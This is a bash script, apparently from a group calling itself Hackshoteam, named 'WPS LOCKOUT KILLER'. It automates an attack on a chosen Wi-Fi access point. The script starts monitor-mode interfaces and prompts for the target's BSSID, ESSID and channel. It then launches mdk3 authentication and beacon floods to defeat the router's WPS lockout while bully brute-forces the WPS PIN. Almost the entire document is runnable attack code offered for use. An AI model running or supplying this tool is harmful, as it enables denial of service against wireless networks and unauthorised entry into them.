#!/bin/bash
#Hackshoteam 
#LOCKEOUT KILLER
#BETA VERSION
#TESTED :KALI


 cleaner () 

{

i="1";

while [ $i -lt 15 ]; 

do

airmon-ng stop mon$i >> /dev/null

i=$((i+1)) 
done                     }

 monitors ()  {
echo "\n [+] Starting Monitors ....."

airmon-ng start $interface >> /dev/null

airmon-ng start $interface >> /dev/null

airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null


echo "\n please restart script \n";

}
start ()
{
echo "\n             Welcome To WPS LOCKOUT KILLER \n"

echo "\n Please enter your interface name (ex:wlan0 )  : \c" 
read interface ;
airmon-ng > /tmp/interface 2>1;
grep -q mon0 /tmp/interface ;
if [ $? -eq 0 ] 

then 
echo "\n Please Make sure you copy Your Target's BSSID & ESSID & channel  \n";

echo " This  Will Be  Killed After 30 seconds \n"; 

gnome-terminal -e "timeout 40s airodump-ng mon0 ";
read -p " Please enter The ESSID  : " essid ; 
read -p " Please enter The BSSID  : " bssid ; 
read -p " Please enter The channel  : " channel ;

else 
echo " Starting mon0 " 
airmon-ng start $interface  >> /dev/null ;
echo " Please restart script " ; 

exit 
fi 

while true 

do 
rm /tmp/interface 2>1 ; 

airmon-ng > /tmp/interface  ;

grep -q mon4 /tmp/interface ;
if [ $? -eq 0 ] 
 then 
rm /tmp/cracklog.txt >> /dev/null ; 



xterm  -e "timeout 2m mdk3 mon1 a -t "$bssid" -e "$essid"  -s 5000 " &

xterm  -e "timeout 2m mdk3 mon2 a -t "$bssid" -e "$essid"  -s 5000 " &

xterm  -e "timeout 2m mdk3 mon3 b -t "$bssid" -e "$essid" -s 5000" & 

xterm  -e "timeout 2m mdk3 mon4 b -t "$bssid" -e "$essid" -s 5000" &

bully -b "$bssid" -A -C -D -F -c $channel  mon0 >> /tmp/cracklog.txt &

tail -f /tmp/cracklog.txt &2>1;
          if 
                tail -f /tmp/cracklog.txt | grep -q Timeout
         then
                killall bully
		killall xterm

                killall tail
        fi

sleep 7m
 else 
monitors
exit ; 
fi
done
}
start


